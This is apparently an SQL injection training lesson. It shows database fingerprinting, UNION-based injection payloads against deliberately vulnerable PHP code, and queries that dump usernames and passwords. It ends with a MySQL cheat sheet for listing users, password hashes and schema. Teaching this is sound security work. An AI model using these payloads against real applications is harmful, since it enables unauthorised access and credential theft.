# SQL INJECTION - LESSON 01

## 'RECON

It is important when we discover an injection to identify the database that we
are dealing with in order to use the best approach.

We have some technique to be sure when we are dealing with a blind or non-blind situation.

- __Cause an error__: the error message will be different for each DBMS (non-blind)
- __Banner grabbing__: exploit the injection to get the DB version (non-blind)
- __Inferring from strings__: different databases concatenates strings in a different way (blind)

### DBMS errors

| Database | Error |
| --- | ---- |
| MySQL | `ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1` |
| MSSQL | `Microsoft OLE DB Provider for SQL Server error '80040e14'<br />Line 1: Incorrect syntax near '1'.` |
| Oracle | `ORA-01773:may not specify column datatypes in this CREATE TABLE` |


### Banner grabbing

| Database | Query |
| --- | --- |
| MySQL | `SELECT version()` <br/> `SELECT @@version`
| MSSQL | `SELECT @@version`
| Oracle | `SELECT banner FROM v$version` <br/>`SELECT banner FROM v$version WHERE rownum=1`

### Inferring from strings

| Database | Query |
| --- | --- |
| MySQL | `SELECT 'coppito' 'zero' 'day'`<br/>`SELECT CONCAT('coppito','zero','day')`
| MSSQL | `SELECT 'coppito' + 'zero' + 'day'`
| Oracle | SELECT 'coppito' &vert;&vert; 'zero' &vert;&vert; 'day' <br/>`SELECT CONCAT('coppito','zero','day')`



## 'UNION BASED

The UNION operator allow to combine the result of two or more `SELECT` statements.

Basic syntax:

```sql
SELECT col1, col2, col3, ..., colN FROM table1
UNION
SELECT col1, col2, col3, ..., colN FROM table2
```

returns a table that contains the results obtained by both the `SELECT` statements.

By default it returns only distinct values.

```sql
SELECT col1, col2, col3, ...,colN FROM table1
UNION ALL
SELECT col1, col2, col3, ...,colN FROM table2
```

This will return also duplicate values.

### LIMITATION OF UNION

- The two queries must return the same number of columns
- Data in corresponding columns must be of the same type (or compatible)

If these conditions fails an error will be returned. We can also use the
error returned to identify the DBMS version.

| DBMS | Error with UNION |
| ---- | ---- |
| MSSQL | All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists­ |
| MySQL | The used SELECT statements have a different number of columns |
| Oracle | ORA-01789: query block has incorrect number of result columns |

We can't know the required number of columns by error, so we have to brute force it.

### GET NUMBER OF COLUMNS

Given this PHP code:
```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    print_r($row);
  }
```

Using `$_GET[id] = "1' UNION ALL SELECT 1 -- -"`, the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1 -- -'
```
It will fail because the number of columns is different.

```sql
SELECT id, title, content WHERE id = '1' UNION ALL SELECT 1, 2 -- - FAILS!'
SELECT id, title, content WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- - OK!'
```

We can achieve the same result using the `ORDER BY` strategy.

`ORDER BY` can accept a column name as parameter, but also a number to identify a column.

Using `$_GET[id] = "1' ORDER BY 1 -- -"`, the query produced will be:

```sql
SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 1 -- -' OK!
SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 2 -- -' OK!
SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 3 -- -' OK!
SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 4 -- -' FAILS!
```

It will fail with `4` and it means that the table has 3 columns.

`ORDER BY` approach is faster with a large number of columns. We can also use
binary search:

Assuming a table with 15 columns:

1. Try with `ORDER BY 8`: no error. Number of columns >= 8
2. Try with `ORDER BY 16`: error. Number of columns >= 8 < 16
3. Try with `ORDER BY 12`: no error. Number of columns >= 12 < 16
4. Try with `ORDER BY 14`: no error. Number of columns >= 14 < 16
5. Try with `ORDER BY 15`: no error. Number of columns = 15


### EXAMPLE

Given this PHP code:
```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    print_r($row);
  }
```

Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 -- -"`, the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
```

We will get:

| id | title | content |
| ---- | ---- | ---- |
| 1 | Titolo News | Contenuto News |
| 1 | 2 | 3 |

### NON-BLIND COLUMNS

`SELECT 1, 2, 3, ..., n` is also useful to identify the output in our page and count
how many columns get printed.

If we got only `1` column that gets printed we can use some trick to output
multiple columns at once.

```sql
SELECT CONCAT('coppito', 'zero', 'day');
```
Will return `coppitozeroday`

```sql
SELECT CONCAT_WS('_', 'coppito', 'zero', 'day');
```
Will return `coppito_zero_day`. The first argument is the separator.

#### How to exploit it?

Given this PHP code, and assuming that there is another table, `users`, with `id`,`username`,`password`:

```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    echo $row['title'];
  }
```

We already tested the number of columns:

Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 -- -"` the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
```

The page will print out also our `2`.
We can take advantage of this to print out all `username`s from `users` table:

Using `$_GET[id] = "' UNION ALL SELECT 1, username, 3 FROM users -- -"` the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, username, 3 FROM users -- -'
```

How can we get all the `users` table in one query?

Using `$_GET[id] = "' UNION ALL SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -"`, the query produced will be:
```sql
  SELECT id, title, content FROM pages WHERE id = '1'
  UNION ALL
  SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -'
```
We will get:

| title |
| ----- |
| Titolo News |
| 1&vert;admin&vert;s3cr3tP4ssw0rd! |
| 2&vert;editor&vert;password |
| ... |
| 4&vert;user&vert;password1 |

### JUST ONE ROW

What we can do if the application prints out just one record?
Our `UNION` result will be stripped out.

```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "' LIMIT 1";
  $result = $conn->query($sql);
  $row = $result->fetch_array();
  print_r($row);
```

Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
```
  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 FROM users -- - LIMIT 1'
```

We will get:

| id | title | content |
| ---- | ---- | ---- |
| 1 | Titolo News | Contenuto News |

We have to add a condition that always makes the WHERE clause false, before our UNION.

Using `$_GET[id] = "'AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
```
  SELECT id, title, content FROM pages WHERE id = '1' AND 1=0
  UNION ALL
  SELECT 1, 2, 3 FROM users -- - LIMIT 1'
```

We will get:

| id | title | content |
| ---- | ---- | ---- |
| 1 | 2 | 3 |


## CHEATSHEET (to weaponize)

We have just learned how to get other data using `UNION` exploiting an SQL Injection.
But how can we discover if there are some other tables? What are the names of the columns? We are DBA?

The cheatsheets come in handy:

MySQL: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

MSSQL: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

ORACLE: http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

POSTGRES: http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

__LEARN BY HEART!!!!__

### MySQL details:

| Target | Query |
| --- | --- |
| Version | `SELECT @@version` |
| Current User | `SELECT user();`<br/>`SELECT system_user();` |
| List Users | `SELECT user FROM mysql.user; -- priv` |
| List Password Hashes | `SELECT host, user, password FROM mysql.user; — priv` |
| Current Database | `SELECT database()` |
| List Databases | `SELECT schema_name FROM information_schema.schemata; -- - for MySQL >= v5.0`<br />`SELECT distinct(db) FROM mysql.db -- - priv` |
| List Tables | `SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'` |
| List Columns | `SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'` |
| ASCII value to CHAR | `SELECT char(65); # returns A` |
| CHAR value to ASCII | `SELECT ascii('A'); # returns 65` |
| String concatenation | `SELECT CONCAT('A','B'); #returns AB`<br/>`SELECT CONCAT_WS(',', 'A','B','C'); # returns A,B,C` |
| Avoiding Quotes | `SELECT 0×414243; # returns ABC` |
| Hostname, IP | `SELECT @@hostname;` |

__LEARN BY HEART!!!!__

## DEMO to extract tables and columns
